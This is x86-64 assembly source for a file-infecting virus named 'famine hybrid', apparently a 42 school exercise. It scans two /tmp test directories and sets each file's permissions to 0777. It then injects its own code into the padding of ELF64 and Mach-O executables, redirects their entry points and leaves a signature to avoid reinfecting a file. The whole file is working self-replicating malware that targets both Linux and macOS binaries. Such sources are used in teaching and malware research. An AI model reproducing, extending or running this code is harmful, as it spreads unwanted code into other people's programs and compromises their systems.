; famine hybrid - size 1106 bytes

%include "famine.inc"

%define translate_syscall call _translate_syscall

bits 64
default rel
global _start
section .text

_host:
                mov         rdx, 13
                mov         rax, 1
                mov         rdi, rax
                lea         rsi, [rel hello]
               
%ifidn __OUTPUT_FORMAT__, elf64
                mov         rax, __NR_write
%elifidn __OUTPUT_FORMAT__, macho64
                mov         rax, Darwin__NR_write | 0x02000000
%endif
                syscall

                xor         rdi, rdi
%ifidn __OUTPUT_FORMAT__, elf64
                mov         rax, __NR_exit
%elifidn __OUTPUT_FORMAT__, macho64
                mov         rax, Darwin__NR_exit | 0x02000000
%endif
                syscall
hello           db          "hello world",33,10,0

_start:
                push        rdi
                push        rsi
                push        rcx
                push        rdx

                lea         rax, [rel _start]
                xor         r15, r15
                mov         r15b, byte [rax + (_platform - _start)]
                mov         rdx, [rel pie_address]
                sub         rax, rdx
                add         rax, [rel entry]
                push        rax

                lea         rdi, [rel slash_tmp]
.opendir:
                mov         r14, rdi
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, __NR_open
                translate_syscall
                jc          .nextdir                            ;XXX expecting carry flag if syscall fails
                test        eax, eax
                jl          .nextdir                

                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd

.readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
                mov         rdx, BUF_SIZE
                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                mov         rdi, [rsp-0x30]                     ;directory fd
                mov         rax, __NR_getdents
                translate_syscall
                test        rax, rax
                jle         .closedir

                xor         r13, r13
                mov         r12, rax
.file:
                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                add         rdi, r13

                xor         edx, edx

                test        r15b, r15b
                jz          .linux_dirent
                mov         dx, word [rdi + 4]                  ; macos d_reclen
                mov         al, byte [rdi + 6]                  ; macos d_type
                add         rdi, 8                              ; macos d_name
                jmp         .increment_idx
.linux_dirent:
                mov         dx, word [rdi + 0x10]               ; linux d_reclen
                dec         edx
                mov         al, byte [rdi + rdx]                ; linux d_type
                inc         edx
                add         rdi, 18                             ; linux d_name
.increment_idx:
                add         r13, rdx

                cmp         al, DT_REG
                jne         .nextfile

                call        process
.nextfile:
                cmp         r13, r12
                jl          .file
                jmp         .readdir

.closedir:      mov         rdi, [rsp-0x30]
                mov         rax, __NR_close
                translate_syscall
.nextdir:
                xor         ecx, ecx
                mul         ecx
                dec         ecx
                mov         rdi, r14
                repnz       scasb
                cmp         byte [rdi], 0
                jnz         .opendir

                pop         rax
                pop         rdx
                pop         rcx
                pop         rsi
                pop         rdi

                jmp         rax

process:                                                        ; expecting filename in rdi
                                                                ; directory in r14
                mov         rsi, r14
                mov         rax, rdi
                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
                mov         rdx, rdi                            ; concat directory and filename

.dirname:       movsb
                cmp         byte [rsi], 0
                jnz         .dirname
                mov         rsi, rax
.filename:      movsb
                cmp         byte [rsi - 1], 0
                jnz         .filename
                mov         rdi, rdx

                push        rdi
                mov         rsi, 0o777
                mov         rax, __NR_chmod                     ; try to set permissions
                translate_syscall
                pop         rdi

                mov         rsi, O_RDWR
                mov         rax, __NR_open
                translate_syscall
                jc          .return                             ; XXX expecting carry flag if open() fails
                test        eax, eax
                jl          .return

                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd

                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
                mov         rdi, [rsp-0x48]
                mov         rax, __NR_fstat
                translate_syscall
                cmp         rax, 0
                jnz         .close

                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
                test        r15b, r15b
                jz          .st_size
                mov         rax, qword [rsp - (0x148-0x48)]     ; macos st_size
.st_size:
                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
                cmp         rax, 0x1000                         ; file too small
                jl          .close

                xor         r9, r9
                mov         r8, [rsp-0x48]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                mov         rsi, rax
                xor         rdi, rdi
                mov         rax, __NR_mmap
                translate_syscall
                cmp         rax, -4095
                jae         .close

                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                mov         rdi, rax

                call        is_valid_elf64
                test        al, al
                jnz         .insert_elf64

                call        is_valid_macho64
                test        al, al
                jz          .unmap

                call        insert_macho64
                jmp         .unmap

.insert_elf64:  call        insert_elf64

.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                mov         rdi, [rsp-0x58]                     ; infect_mem
                mov         rax, __NR_munmap
                translate_syscall

.close:         mov         rdi, [rsp-0x48]
                mov         rax, __NR_close
                translate_syscall
.return:        ret

is_valid_elf64:                                                 ; expecing data in rdi
                xor         rax, rax                            ; result in rax; 1 = valid
                cmp         qword [rdi + 8], rax
                jnz         .return
                mov         rdx, ELF_SYSV
                cmp         qword [rdi], rdx
                jz          .continue
                mov         rdx, ELF_GNU
                cmp         qword [rdi], rdx
                jnz         .return
.continue:      mov         rdx, ELF64_ET_DYN
                cmp         qword [rdi + 0x10], rdx
                jz          .ok
                mov         rdx, ELF64_ET_EXEC
                cmp         qword [rdi + 0x10], rdx
                jnz         .return
.ok:            inc         rax
.return:        ret

is_valid_macho64:
                push        rdi
                call        .mach_header_64
                db          0xcf, 0xfa, 0xed, 0xfe, 7, 0, 0, 1, 3, 0, 0, 0x80, 2, 0, 0, 0
.mach_header_64:pop         rsi
                xor         ecx, ecx
                mul         rcx
                mov         cl, 4
                repe        cmpsd
                jnz         .return
                inc         al
.return:        pop         rdi
                ret

insert_elf64:                                                   ; expecting data in rdi
                push        r13
                push        r14
                push        r15

                mov         r15, rdi

                mov         rdx, qword [r15 + 0x18]             ; entry point
                mov         rax, qword [rdi + 0x20]             ; e_phoff
                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
                add         rdi, rax                            ; rdi = *Elf64_Phdr
.segment:       cmp         rcx, 0
                jle         .return
                mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                cmp         rax, qword [rdi]
                jnz         .next
                mov         rax, qword [rdi + 0x10]             ; p_vaddr
                cmp         rdx, rax
                jb          .next
                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
                mov         r13, rax                            ; new entry point
                cmp         rdx, rax
                jae         .next

                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
                add         rax, qword [rdi + 0x20]             ; rax += p_filesz

                mov         r14, rdi                            ; code segment Elf64_Phdr*

                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
                mov         rsi, rdi                            ; save: end of segment
                xor         al, al
                mov         rcx, _finish - _start
                repz        scasb
                test        rcx, rcx
                ja          .return                             ; not enough room

                lea         rdi, [rel _start]
                xchg        rdi, rsi
                mov         rax, [rel signature]
                cmp         rax, qword [rdi - (_finish - signature)]
                jz          .return                             ; already infected
                mov         rcx, _finish - _start
                repnz       movsb
                                                                ;r15 = beginning of file
                                                                ;r14 = code segment header
                                                                ;r13 = new entry point

                mov         rax, qword [r15 + 0x18]             ; entry point
                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
                mov         byte [rdi - 17], 0
                mov         qword [r15 + 0x18], r13             ; fix entry point
                mov         rax, _finish - _start
                add         qword [r14 + 0x20], rax             ; increase p_filesz
                add         qword [r14 + 0x28], rax             ; increase p_memsz
                jmp         .return

.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
                dec         rcx
                jmp         .segment

.return:
                pop         r15
                pop         r14
                pop         r13
                ret

insert_macho64:                                                 ; expecting data in rdi
                push        r12
                push        r13
                mov         rsi, rdi
                mov         ecx, dword [rdi + 0x10]             ; mach_header_64.ncmds
                add         rdi, 0x20
                xor         r12, r12
                xor         r13, r13
.lc_segment_64: cmp         dword [rdi], LC_SEGMENT_64
                jnz         .lc_main
                mov         rax, 0x0000545845545F5F             ; "__TEXT",0,0
                cmp         rax, qword [rdi + 8]                ;
                jnz         .next_lcmd
                                                                ; XXX note: expecting first section of __TEXT segment
                                                                ; to be the __text section
                cmp         rax, qword [rdi + 0x48 + 0x10]      ; this should work for most but not all binaries
                jnz         .return
                mov         rdx, 0x0000747865745F5F             ; "__text",0,0
                cmp         rdx, qword [rdi + 0x48]             ; section_64.sectname
                jnz         .return
                mov         r12, rdi                            ; at this point r12 points to segment_command_64
                                                                ; sizeof segment_command_64 = 0x48
                                                                ; sizeof section_64 = 0x50
                                                                ; dword at [r12 + 0x48 + 0x30] is section_64.offset
.lc_main:       cmp         dword [rdi], LC_MAIN
                jnz         .next_lcmd
                test        r12, r12
                jz          .return
                lea         r13, [rdi+8]                        ; r13 points to entry_point_command
                                                                ; qword at [r13 + 8] is entryoff
                mov         rdi, rsi
                mov         eax, dword [r12 + 0x48 + 0x30]      ; file offset of __text section
                add         rdi, rax
                mov         ecx, (_finish - _start) + 0x50      ; size + extra padding
                sub         rdi, rcx

                xor         al, al
                repz        scasb
                test        ecx, ecx
                ja          .return                             ; not enough room

                mov         ecx, (_finish - _start)
                sub         rdi, rcx
                mov         rdx, rdi
                mov         rax, rdi
                sub         rax, rsi                            ; rax == new entry point
                lea         rsi, [rel _start]
                rep         movsb

                mov         rcx, qword [r13]                    ; get entry point
                mov         qword [r13], rax

                mov         qword [rdi - 8], rcx                ; store entry point
                mov         qword [rdi - 16], rax               ; store pos
                mov         byte [rdi - 17], 1                  ; mark mach-o
                jmp         .return

.next_lcmd:     mov         eax, dword [rdi + 4]                ; cmdsize
                add         rdi, rax
                dec         ecx
                jnz        .lc_segment_64
.return         pop         r13
                pop         r12
                ret

_translate_syscall:                                             ; expecting r15 == 0 on linux
                test        r15, r15                            ; anything else on macos
                jz          .ready
                push        rdi
                push        rcx
                call        .get
                db          0x02, 0x03, 0x05, 0x09, 0x0b, 0x4e, 0x5a
                db          0x05, 0x06, 0xbd, 0xc5, 0x49, 0xc4, 0x0f
.get:           pop         rdi
                mov         rcx, 7                              ; num syscalls
                repne       scasb
                add         rdi, 6                              ; num syscalls - 1
                mov         al, byte [rdi]
                or          eax, 0x02000000;
                pop         rcx
                pop         rdi
.ready:         syscall
                ret

slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
signature       db          "famine! hybrid @42siliconvalley",0

_platform:
%ifidn __OUTPUT_FORMAT__, elf64
                db          0
%elifidn __OUTPUT_FORMAT__, macho64
                db          1
%endif

pie_address     dq          (_start - _host)
entry           dq          0
_finish:
